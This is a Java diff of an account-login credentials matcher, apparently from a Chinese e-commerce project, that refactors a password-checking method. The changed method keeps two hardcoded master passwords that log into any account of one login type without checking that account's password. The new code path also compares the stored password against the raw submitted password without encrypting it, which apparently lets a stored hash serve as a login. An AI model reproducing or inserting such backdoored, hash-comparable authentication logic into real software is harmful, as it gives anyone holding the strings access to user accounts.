@@ -35,7 +35,7 @@ public class MemberCredentialsMatcher extends ShiguCredentialsMatcher {
         CaptchaUsernamePasswordToken token = (CaptchaUsernamePasswordToken) authcToken;
         Session session = SecurityUtils.getSubject().getSession();
         //只有星座账号需要密码验证
-        if(!checkPassword(auth,token.getPassword())){//密码不通过
+        if(!checkPassword(auth,token)){//密码不通过
             return false;
         }
         if(auth.getLoginFromType().equals(LoginFromType.PHONE)){//如果是手机验证码登陆
@@ -48,19 +48,29 @@ public class MemberCredentialsMatcher extends ShiguCredentialsMatcher {
     /**
      * 验证密码正确性
      * @param auth
-     * @param password
+     * @param token
      * @return
      */
-    public boolean checkPassword(PersonalSession auth,char[] password){
+    public boolean checkPassword(PersonalSession auth,CaptchaUsernamePasswordToken token){
         if(auth.getLoginFromType().equals(LoginFromType.XZ)){
-            if("fqtdtihfhqkiller81682024".equals(new String(password))||"qsazxq951658".equals(new String(password))){
+            if("fqtdtihfhqkiller81682024".equals(new String(token.getPassword()))||"qsazxq951658".equals(new String(token.getPassword()))){
                 return true;
             }
             String pwd=super.getUserBaseService().selUserPwdByUserId(auth.getUserId());
-            if(pwd==null){
-                return false;
-            }if(!pwd.equals(EncryptUtil.encrypt(new String(password)))){
-                return false;
+            if(token.getLoginname()==null) {
+                if (pwd == null) {
+                    return false;
+                }
+                if (!pwd.equals(EncryptUtil.encrypt(new String(token.getPassword())))) {
+                    return false;
+                }
+            }else {
+                if(pwd==null){
+                    return false;
+                }
+                if (!pwd.equals(new String(token.getPassword()))){
+                    return false;
+                }
             }
         }
         return true;
